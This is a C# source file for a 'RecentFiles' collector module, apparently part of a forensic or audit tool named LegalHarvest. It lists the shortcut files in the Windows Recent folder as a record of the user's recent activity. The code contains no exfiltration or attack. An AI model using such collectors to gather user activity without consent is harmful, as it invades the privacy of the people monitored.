using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class RecentFilesModule : ICollectorModule
    {
        public string ModuleName => "RecentFiles";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string recentDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
            if (!Directory.Exists(recentDir)) return items;

            foreach (string file in Directory.GetFiles(recentDir, "*.lnk"))
                items.Add(new CollectedItem { Category = "RecentFile", Name = Path.GetFileNameWithoutExtension(file), Value = file, Timestamp = DateTime.Now });
            return items;
        }
    }
}
